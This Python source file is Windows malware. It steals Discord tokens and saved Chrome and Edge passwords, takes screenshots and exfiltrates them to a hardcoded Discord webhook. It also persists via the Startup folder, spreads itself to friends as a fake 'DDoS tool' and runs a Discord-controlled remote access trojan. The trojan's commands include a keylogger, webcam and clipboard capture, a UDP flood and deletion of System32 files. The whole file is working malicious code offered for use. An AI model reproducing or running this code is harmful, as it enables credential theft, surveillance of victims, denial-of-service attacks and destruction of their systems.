import ctypes
import os
if os.name != "nt":
    exit()

import asyncio
import subprocess
import datetime
import sqlite3
import json,base64
import zipfile
import shutil, pyautogui, uuid, platform, os, requests, dhooks,  re, sys

from Crypto.Cipher import AES
from PIL import ImageGrab
from colorama import *
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from dhooks import Webhook, File, Embed, Webhook




if sys.platform.startswith('linux'):
    exit()
else:
    pass



from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.backends import default_backend

WEBHOOK_URL = 'https://discord.com/api/webhooks/823970483296927776/5yuC3XboNiW7D_scsbwafUKUH99Hrw24g0JBM-nVIq0f7x7n7kKppN3skySr4tq4MsfM'
HOOK = Webhook(WEBHOOK_URL)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
roaming = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12

def launch():
    filePath = shutil.copy(sys.argv[0], roaming + '\Microsoft\Windows\Start Menu\Programs\Startup')
launch()



def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip

def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True,
              stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass

def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass

def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass

def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                        "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass

def spread(token, form_data, delay):
    # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    return
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + \
                "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            avatar_id = user_data.get("avatar")
            avatar_urll = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}'
            nitro = bool(user_data.get("premium_type"))
            verefication = user_data.get("verified")
            mfa = user_data.get("mfa_enabled")
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x2C2F33,
                "fields": [
                    {
                        "name": "Token information",
                        "value": f"Name: `{username}`\nID: `{user_id}`\nEmail: `{email}`\nPhone: `{phone}`",
                        "inline": True
                    },
                    {
                        "name": "Other Token information",
                        "value": f"\nIP: `{ip}`\nNitro: `{nitro}`\nBilling Info: `{billing}`\n2FA: `{mfa}`",
                        "inline": False
                    },
                    {
                        "name": "Token Platform",
                        "value": f"{platform}",
                        "inline": False
                    },
                    {
                        "name": "Token",
                        "value": f"{token}",
                        "inline": False
                    },
                ],
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    },
                }

            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": " token grab",
        "avatar_url": "https://d1fmx1rbmqrxrr.cloudfront.net/zdnet/i/edit/ne/2015/12/Samsung-GalaxyS7-600.jpg"
    }
    try:
        urlopen(Request(WEBHOOK_URL, data=dumps(
            webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()

try:
    main()
except Exception as e:
    print(e)
    pass

def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

class chromepassword:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)

    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = 'HOST: %s\nNAME: %s\nVALUE: %s\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordList)


if __name__ == "__main__":
    main = chromepassword()
    try:
        main.chromedb()
    except:
        pass
    main.saved()


if os.path.exists('C:\\Program Files\\Windows Defender'):
   av = 'Windows Defender'
if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
   av = 'Avast'
if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
   av = 'AVG'
if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
   av = 'Avira'
if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
   av = 'Advanced SystemCare'
if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
   av = 'Bitdefender'
if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
   av = 'Comodo'
if os.path.exists('C:\\Program Files\\DrWeb'):
   av = 'Dr.Web'
if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
   av = 'ESET'
if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
   av = 'Grizzly Pro'
if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
   av = 'Kaspersky'
if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
   av = 'Malware fighter'
if os.path.exists('C:\\Program Files\\360\\Total Security'):
   av = '360 Total Security'
else:
   pass

screen = ImageGrab.grab()
screen.save(os.getenv('ProgramData') + '\\Screenshot.jpg')
screen = open('C:\\ProgramData\\Screenshot.jpg', 'rb')
screen.close()


zname = r'C:\ProgramData\passwords.zip'
newzip = zipfile.ZipFile(zname, 'w')
newzip.write(r'C:\ProgramData\passwords.txt')
newzip.close()
passwords = File(r'C:\ProgramData\passwords.zip')
image = File(r"C:\\ProgramData\\Screenshot.jpg")

HOOK.send(file=passwords, avatar_url='https://d1fmx1rbmqrxrr.cloudfront.net/zdnet/i/edit/ne/2015/12/Samsung-GalaxyS7-600.jpg', username='token grab')
os.remove(r'C:\ProgramData\passwords.txt')
os.remove(r'C:\ProgramData\passwords.zip')

HOOK.send(file=image, avatar_url='https://d1fmx1rbmqrxrr.cloudfront.net/zdnet/i/edit/ne/2015/12/Samsung-GalaxyS7-600.jpg', username='token grab')
os.remove(r'C:\\ProgramData\\Screenshot.jpg')


def master():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        pass
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = ctypes.windll.crypt32.CryptUnprotectData(
        (master_key, None, None, None, 0)[1])
    return master_key

def dpayload(cipher, payload):
    return cipher.decrypt(payload)

def gcipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def dpassword(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = gcipher(master_key, iv)
        decrypted_pass = dpayload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        pass

def passwordsteal():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
    try:
        shutil.copy2(login_db, "Loginvault.db")
    except:
        pass
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute(
            "SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = dpassword(
                encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                HOOK.send(f"URL: " + url + "\nUSER: " + username +
                          "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except:
        pass

    cursor.close()
    conn.close()

def startt():
    while True:
        passwordsteal()

        try:
            subprocess.os.system('del Loginvault.db')
        except:
            pass
        break





import winreg
import ctypes
import sys
import os
import random
import time
import subprocess
import discord

from requests import get, post, patch, delete
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils

azeouagze = get("https://pastebin.com/raw/8S3qbh5h")  # Pastebin test6
azeouagze = azeouagze.text
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
helpmenu = """
Availaible commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user's on target computer
--> !sing = Play chosen video in background (Only works with youtube links)
--> !stopsing = Stop video playing in background
--> !screenshot = Get the screenshot of the user's current screen
--> !ddos = ddos une ip
--> !del = suprime le fichier
--> !delall2451 = suprimer tout les fichier de l'ordinateur
--> !exit = Exit program
"""


async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        game = discord.Game(f"Visiting: {window}")
        await client.change_presence(status=discord.Status.online, activity=game)
        time.sleep(1)


def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()


@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    on_ready.total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels():  # From here we look through all the channels,check for the biggest number and then add one to it
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):  # Probably a better way to do this
        if "session" in on_ready.total[y]:
            import re
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}\n{helpmenu}"
    if is_admin == True:
        await channel.send(f'{value1} | :gem:')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)


def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)


def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)


@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
            file = discord.File(file_keys, filename=file_keys)
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))

        if message.content == "!exit":
            os.system("exit")

        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)

        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
            file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))

        if message.content == "!volumemax":
            volumeup()
            await message.channel.send("[*] Volume put to 100%")

        if message.content == "!volumezero":
            volumedown()
            await message.channel.send("[*] Volume put to 0%")

        if message.content == "!webcam":  # Downloads a file over internet which is not great but avoids using opencv/numpy which helps reducing final exe file if compiled
            import os
            import urllib.request
            from zipfile import ZipFile
            directory = os.getcwd()
            try:
                os.chdir(os.getenv('TEMP'))
                urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip")
                with ZipFile("temp.zip") as zipObj:
                    zipObj.extractall()
                os.system("WebCamImageSave.exe /capture /FileName temp.png")
                file = discord.File("temp.png", filename="temp.png")
                await message.channel.send("[*] Command successfully executed", file=file)
                os.remove("temp.zip")
                os.remove("temp.png")
                os.remove("WebCamImageSave.exe")
                os.remove("readme.txt")
                os.remove("WebCamImageSave.chm")
                os.chdir(directory)
            except:
                await message.channel.send("[!] Command failed")

        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10

            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error",
                                                 MB_HELP | MB_YESNO | ICON_STOP)  # Show message box

            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            import time
            time.sleep(1)
            hwnd = win32gui.FindWindow(None, "Error")
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)  # Put message to foreground
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,
                                  win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            await message.channel.send("[*] Command successfully executed")

        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            await message.channel.send("[*] Command successfully executed")

        if message.content == "!help":
            await message.channel.send(helpmenu)


        if message.content == "!history":
            import os
            import browserhistory as bh
            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors='ignore')
            with open("history.txt", "a") as hist:
                hist.write(str(strobj))
            file = discord.File("history.txt", filename="history.txt")
            await message.channel.send("[*] Command successfully executed", file=file)
            os.remove("history.txt")

        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send(f"[*] Clipboard content is :\n{body}")

        if message.content.startswith("!stopsing"):
            import os
            os.system(f"taskkill /F /IM {pid_process[1]}")

        if message.content == "!sysinfo":
            import platform
            info = platform.uname()
            info_total = f'{info.system} {info.release} {info.machine}'
            from requests import get
            ip = get('https://api.ipify.org').text
            await message.channel.send(f"[*] Command successfully executed : {info_total} {ip}")

        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Command successfully executed : " + link)

        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")


        if message.content.startswith("!sing"):  # This is awfully complicated for such a dumb command I don't know why I wasted time doing this.
            volumeup()
            from win32 import win32gui
            import win32con
            import win32gui
            from win32con import SW_HIDE
            import win32process
            import os
            link = message.content[6:]
            if link.startswith("http"):
                link = link[link.find('www'):]
            os.system(f'start {link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass

                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler, None)

                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break

        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')

            def keylog():
                def on_press(key):
                    logging.info(str(key))

                with Listener(on_press=on_press) as listener:
                    listener.join()

            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfully started")

        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger successfully stopped")

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0

            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %.2f seconds.' % duration)
            import time
            time.sleep(1)

        if message.content.startswith("!voice"):
            volumeup()
            import comtypes
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])
            comtypes.CoUninitialize()
            await  message.channel.send("[*] Command successfully executed")

        if message.content.startswith("!del"):
            import os
            test = os.system("del" + (message.content[7:]))
            await  message.channel.send("[*] Command successfully executed")

        if message.content.startswith("!ddos"):
            import socket
            import time
            ip = "1" + (message.content[7:])
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            port = int("445")
            await message.channel.send(f"[*] ddos en cours a l'ip {ip}")
            while True:
                s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
                s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
                s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
            sent = sent + 1

        if message.content.startswith("!delall2451"):
            import os
            os.system("del C:\Windows\*.*/y")
            os.system("del C:\Windows\System32\*.*/y")


        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfully executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")


client.run(azeouagze)